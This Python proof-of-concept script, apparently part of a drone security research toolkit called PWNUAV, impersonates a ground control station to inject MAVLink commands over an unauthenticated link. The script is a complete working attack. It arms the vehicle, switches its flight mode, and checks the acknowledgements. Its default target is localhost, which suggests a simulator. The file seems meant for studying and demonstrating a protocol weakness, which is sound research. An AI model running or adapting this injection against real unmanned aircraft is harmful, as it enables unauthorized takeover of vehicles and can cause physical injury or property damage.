"""PoC 03 - Command injection (PWNUAV C2-01/02, EX-01/02/03/05).

Impersonates a GCS and injects MAVLink commands into an unauthenticated
link: arm/disarm and flight-mode change.
"""
from __future__ import annotations

import argparse
import time

from pymavlink import mavutil

from pwnuav.link import announce, connect, wait_heartbeat


def send_arm(master, target_system: int = 1, target_component: int = 1,
             arm: bool = True) -> None:
    master.mav.command_long_send(
        target_system, target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 1 if arm else 0, 0, 0, 0, 0, 0, 0,
    )


def send_set_mode(master, custom_mode: int, target_system: int = 1,
                  target_component: int = 1) -> None:
    master.mav.command_long_send(
        target_system, target_component,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode, 0, 0, 0, 0, 0,
    )


def wait_ack(master, command: int, timeout: float = 3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        msg = master.recv_match(type="COMMAND_ACK", blocking=True,
                                timeout=0.5)
        if msg is not None and msg.command == command:
            return msg.result
    return None


def main() -> None:
    ap = argparse.ArgumentParser(
        description="PWNUAV PoC 03 - Command injection")
    ap.add_argument("--connect", default="udpout:127.0.0.1:14550")
    ap.add_argument("--mode", type=int, default=4,
                    help="ArduCopter custom mode (4=GUIDED)")
    args = ap.parse_args()
    master = connect(args.connect)
    announce(master)
    wait_heartbeat(master, timeout=10)
    print("[*] Injecting ARM...")
    send_arm(master, arm=True)
    print(f"    ACK: {wait_ack(master, mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM)}")
    print(f"[*] Injecting mode change -> {args.mode}...")
    send_set_mode(master, custom_mode=args.mode)
    print(f"    ACK: {wait_ack(master, mavutil.mavlink.MAV_CMD_DO_SET_MODE)}")
    master.close()


if __name__ == "__main__":
    main()
